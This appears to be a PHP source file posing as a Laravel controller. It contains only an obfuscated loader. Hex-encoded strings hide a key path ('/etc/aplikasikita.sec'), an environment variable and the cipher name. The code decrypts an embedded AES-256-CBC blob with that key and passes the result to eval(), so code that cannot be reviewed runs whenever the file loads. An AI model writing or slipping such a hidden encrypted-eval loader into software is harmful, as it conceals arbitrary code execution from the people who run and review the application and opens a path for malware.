<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('yV5HgyGJlrAREn2mRfNQwg==');

$c=base64_decode(

'dg1ZmtSfrLPTecPVE6ZgAm9vPPvhPmLS1/RQO4oRBOqqKTSuGzguY2fsqxgJHhsxGi6cD5EkH5my' .
'MSqZ9GUFSXOIU68NHu/6xL1587ZdLq6uPTpfrbd5RZS7xNyQFaN4vxl1//g7E10eS8Yzp3DyFrGK' .
'opADuX6UieB9WtSFYHofBfX46AEURyVJjOoW29cJJgDvK9CbOntRq+Efmjkh/CiX2t8aONf7Fm0o' .
'QpCLTLEuT7udoqOfC+mtzRC7z4FV'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

